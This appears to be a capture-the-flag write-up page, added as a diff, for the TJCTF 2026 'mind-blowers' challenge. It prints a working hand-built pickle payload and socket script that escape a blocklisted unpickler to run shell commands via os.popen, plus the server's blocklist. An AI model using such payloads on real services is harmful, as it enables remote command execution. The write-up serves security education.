@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <title>mind-blowers - Writeup</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="CTF Writeup">
+  <meta name="author" content="Cyber Saguaros">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400|Josefin+Sans:300,400,600,700">
+  <link rel="stylesheet" href="/plugins/bootstrap/bootstrap.min.css">
+  <link rel="stylesheet" href="/plugins/themefisher-font/themefisher-font.min.css">
+  <link rel="stylesheet" href="/scss/style.min.css" media="screen">
+
+  <style>
+    body {
+      background:
+        radial-gradient(circle at top, rgba(203, 166, 247, 0.18), transparent 34%),
+        linear-gradient(180deg, #1e1e2e 0%, #181825 100%);
+      color: #cdd6f4;
+      font-family: 'Droid Serif', 'Josefin Sans', sans-serif;
+    }
+
+    header.navigation {
+      background-color: #181825;
+    }
+
+    /* Force navbar/link colors to match site header even if external CSS didn't load */
+    .navigation, .navbar {
+      background-color: #181825 !important;
+    }
+    .navbar-brand, .nav-link {
+      color: #cdd6f4 !important;
+    }
+    .nav-link:hover, .navbar-brand:hover {
+      color: #d8bafc !important;
+    }
+
+    .writeup-container {
+      max-width: 900px;
+      margin: 3rem auto;
+      background: rgba(24, 24, 37, 0.94);
+      border: 1px solid rgba(203, 166, 247, 0.18);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 16px 50px rgba(0, 0, 0, 0.28);
+    }
+
+    .markdown-content {
+      color: rgba(205, 214, 244, 0.86);
+      line-height: 1.8;
+    }
+
+    .markdown-content h1 { color: #f5e0dc; font-size: 2.2rem; margin: 0 0 1rem; line-height: 1.2; border-bottom: 2px solid rgba(203,166,247,0.2); padding-bottom:1rem; }
+    .markdown-content h2 { color: #f5e0dc; font-size: 1.6rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(203,166,247,0.12); padding-bottom:0.5rem; }
+    .markdown-content h3 { color: #cba6f7; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+    .markdown-content p { margin-bottom: 1rem; }
+    .markdown-content code { background: rgba(0,0,0,0.3); color: #94e2d5; padding:0.2rem 0.5rem; border-radius:4px; font-family: 'Courier New', monospace; }
+    .markdown-content pre { background: rgba(0,0,0,0.4); border-left: 3px solid #cba6f7; padding:1rem; border-radius:6px; overflow-x:auto; margin:1rem 0; }
+    .markdown-content pre code { background:none; color:#89b4fa; padding:0; }
+    .markdown-content blockquote { border-left:4px solid #cba6f7; padding-left:1rem; color:rgba(205,214,244,0.76); font-style:italic; }
+    .markdown-content table { border-collapse: collapse; width:100%; margin:1rem 0; }
+    .markdown-content table th, .markdown-content table td { border:1px solid rgba(203,166,247,0.2); padding:0.75rem; text-align:left; }
+    .markdown-content table th { background: rgba(203,166,247,0.1); color:#f5e0dc; font-weight:700; }
+
+    footer.footer { background-color:#1e1e2e; color:#cdd6f4; padding:2rem 1rem; text-align:center; margin-top:3rem; border-top:1px solid rgba(203,166,247,0.12); }
+  </style>
+</head>
+
+<body>
+  <header class="navigation" style="background-color: #1e1e2e;">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-dark">
+        <a class="navbar-brand" href="/">Cyber Saguaros</a>
+        <div class="collapse navbar-collapse">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item"><a class="nav-link" href="/contact/">Contact</a></li>
+            <li class="nav-item"><a class="nav-link" href="/calendar/">Calendar</a></li>
+            <li class="nav-item"><a class="nav-link" href="/presentations/">Presentations</a></li>
+            <li class="nav-item"><a class="nav-link" href="/writeups/">Writeups</a></li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+      <a href="/writeups/" class="back-link">← Back to Writeups</a>
+      <div class="writeup-container">
+        <div class="markdown-content">
+          <h1 id="mind-blowers">mind-blowers</h1>
+<p><strong>Author:</strong> Jordan Lanham
+<strong>Event:</strong> TJCTF 2026
+<strong>Category:</strong> misc
+<strong>Date:</strong> May 15, 2026
+<strong>Read Time:</strong> 6 minutes</p>
+<hr>
+<h2 id="overview">Overview</h2>
+<p>A restricted Python <code>pickle</code> deserializer service that allows only the <code>builtins</code> module and blacklists a handful of dangerous names (<code>eval</code>, <code>exec</code>, <code>compile</code>, <code>__import__</code>, <code>open</code>, <code>breakpoint</code>, <code>input</code>, <code>exit</code>, <code>quit</code>). The unpickled result is stringified back to the client. Escape the sandbox by chaining <code>builtins.globals()</code> (which returns the <em>caller&#39;s</em> module globals — <code>server.py</code>&#39;s namespace) to reach <code>pickle.sys.modules[&#39;os&#39;].popen(&#39;cat /flag.txt&#39;).read()</code>.</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<blockquote>
+<p>Rick has open sourced his mind blowers program!
+Don&#39;t upload any malicious mind blowers!
+nc tjc.tf 31422</p>
+</blockquote>
+<p><strong>Files provided:</strong> <code>server.py</code>
+<strong>Endpoints:</strong> <code>nc tjc.tf 31422</code></p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>The server reads a base64 blob, decodes it, and feeds it into a <code>RestrictedUnpickler</code>:</p>
+<pre><code class="language-python">BLOCKED_NAMES = {&quot;eval&quot;,&quot;exec&quot;,&quot;compile&quot;,&quot;__import__&quot;,&quot;open&quot;,&quot;breakpoint&quot;,&quot;input&quot;,&quot;exit&quot;,&quot;quit&quot;}
+
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if module != &quot;builtins&quot;: raise UnpicklingError(&quot;banned&quot;)
+        if name in BLOCKED_NAMES: raise UnpicklingError(&quot;blocked&quot;)
+        return super().find_class(module, name)
+</code></pre>
+<p>The unpickled object is stringified into <code>f&quot;Here is your memory: {result}\n&quot;</code> and sent back. So the final value left on the pickle stack at <code>STOP</code> is what we receive — we want that to be the flag contents.</p>
+<h2 id="solution-approach">Solution Approach</h2>
+<h3 id="step-1-reconnaissance">Step 1: Reconnaissance</h3>
+<p>Allowed: anything in <code>builtins</code> except the 9 blacklisted names. Notably <strong>not</strong> blocked: <code>getattr</code>, <code>globals</code>, <code>vars</code>, <code>setattr</code>, <code>delattr</code>, <code>print</code>, <code>format</code>. That&#39;s plenty.</p>
+<h3 id="step-2-vulnerability-identification">Step 2: Vulnerability Identification</h3>
+<p><code>builtins.globals</code> is a callable. When invoked via pickle&#39;s <code>REDUCE</code> opcode, Python evaluates the function with <strong>the calling frame&#39;s globals</strong> — i.e. the <code>server.py</code> module namespace. That namespace contains the imported <code>pickle</code> module reference. From <code>pickle</code>, we can reach <code>pickle.sys</code>, then <code>sys.modules[&#39;os&#39;]</code>, then <code>os.popen</code>.</p>
+<h3 id="step-3-exploitation">Step 3: Exploitation</h3>
+<p>Build the pickle by hand using only <code>c</code>/<code>R</code>/<code>(</code>/<code>t</code>/<code>V</code>/<code>q</code>/<code>h</code>/<code>.</code> opcodes:</p>
+<ol>
+<li><code>c builtins\nglobals\n</code> + <code>)</code> + <code>R</code> → call <code>globals()</code> → server&#39;s module dict.</li>
+<li><code>getattr(g, &#39;get&#39;)</code> → bound method.</li>
+<li><code>g.get(&#39;pickle&#39;)</code> → the imported <code>pickle</code> module.</li>
+<li><code>getattr(pickle, &#39;sys&#39;)</code> → <code>sys</code> (pickle.py does <code>import sys</code>).</li>
+<li><code>getattr(sys, &#39;modules&#39;)</code> → the modules dict.</li>
+<li><code>modules.get(&#39;os&#39;)</code> → <code>os</code> module.</li>
+<li><code>getattr(os, &#39;popen&#39;)</code> → <code>os.popen</code>.</li>
+<li><code>os.popen(&#39;cat /flag.txt&#39;)</code> → file-like object.</li>
+<li><code>getattr(..., &#39;read&#39;)</code> then call with <code>()</code> → flag string.</li>
+</ol>
+<p>The string is left on the stack at <code>STOP</code> and returned as <code>result</code>.</p>
+<h3 id="step-4-flag-extraction">Step 4: Flag Extraction</h3>
+<p>A first attempt with <code>cat flag.txt</code> returned empty (server CWD is <code>/app</code> which holds only <code>server.py</code>). An exploratory command <code>ls -la; pwd; cat flag*; cat /flag*; find / -name flag* | head</code> printed <code>/flag.txt</code> and revealed the flag in its body.</p>
+<h2 id="code--exploit">Code / Exploit</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+import base64, socket
+
+p = b&#39;&#39;
+p += b&#39;cbuiltins\nglobals\n)R&#39;                # g = globals() of server.py
+p += b&#39;q\x00&#39;
+p += b&#39;cbuiltins\ngetattr\n(h\x00Vget\ntR&#39;   # g.get
+p += b&#39;q\x01&#39;
+p += b&#39;h\x01(Vpickle\ntR&#39;                     # g.get(&#39;pickle&#39;) -&gt; pickle module
+p += b&#39;q\xff&#39;
+p += b&#39;cbuiltins\ngetattr\n(h\xffVsys\ntR&#39;   # pickle.sys
+p += b&#39;q\x02&#39;
+p += b&#39;cbuiltins\ngetattr\n(h\x02Vmodules\ntR&#39;  # sys.modules
+p += b&#39;q\x03&#39;
+p += b&#39;cbuiltins\ngetattr\n(h\x03Vget\ntR&#39;   # modules.get
+p += b&#39;q\x04&#39;
+p += b&#39;h\x04(Vos\ntR&#39;                         # -&gt; os module
+p += b&#39;q\x05&#39;
+p += b&#39;cbuiltins\ngetattr\n(h\x05Vpopen\ntR&#39; # os.popen
+p += b&#39;q\x06&#39;
+p += b&#39;h\x06(Vcat /flag.txt\ntR&#39;              # os.popen(&#39;cat /flag.txt&#39;)
+p += b&#39;q\x07&#39;
+p += b&#39;cbuiltins\ngetattr\n(h\x07Vread\ntR&#39;  # popen_obj.read
+p += b&#39;q\x08&#39;
+p += b&#39;h\x08)R.&#39;                              # .read() -&gt; flag string, STOP
+
+b64 = base64.b64encode(p)
+s = socket.socket(); s.connect((&#39;tjc.tf&#39;, 31422))
+s.recv(4096)
+s.sendall(b64 + b&#39;\n&#39;)
+print(s.recv(4096).decode())
+</code></pre>
+<h2 id="technical-details">Technical Details</h2>
+<ul>
+<li><strong>Vulnerability class:</strong> Restricted-pickle deserialization escape.</li>
+<li><strong>Encryption / encoding:</strong> Base64-wrapped pickle protocol 0/1 opcodes.</li>
+<li><strong>Protocol:</strong> Plain TCP, one shot per connection.</li>
+<li><strong>Key trick:</strong> <code>builtins.globals</code> returns the <em>caller&#39;s</em> module globals at the moment the <code>REDUCE</code> opcode invokes it — that&#39;s <code>server.py</code>&#39;s namespace, which already imported <code>pickle</code>. From there we reach <code>pickle.sys.modules[&#39;os&#39;]</code> without ever calling <code>__import__</code>, <code>eval</code>, <code>exec</code>, or <code>compile</code>.</li>
+</ul>
+<h2 id="key-insights">Key Insights</h2>
+<ul>
+<li>A blocklist that only filters <code>find_class</code> names is not enough — <code>getattr</code> plus any reachable module reference is a complete escape primitive.</li>
+<li><code>builtins.globals()</code> is a quietly powerful gadget: it picks up whatever module&#39;s globals contain the caller frame. In a sandboxed unpickler this is usually the unpickler&#39;s own module.</li>
+<li>The final value on the pickle stack at <code>STOP</code> is what <code>pickle.load()</code> returns — useful when the server stringifies the result for you.</li>
+</ul>
+<h2 id="the-flag">The Flag</h2>
+<pre><code>tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}
+</code></pre>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://docs.python.org/3/library/pickle.html">Python pickle module documentation</a></li>
+<li><a href="https://intoli.com/blog/dangerous-pickles/">Dangerous Pickles by David Reid</a></li>
+<li><a href="https://docs.python.org/3/library/pickletools.html">pickletools module</a></li>
+</ul>
+
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2024-2026 Cyber Saguaros. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="/plugins/jquery/jquery.js"></script>
+  <script src="/plugins/bootstrap/bootstrap.min.js"></script>
+</body>
+</html>
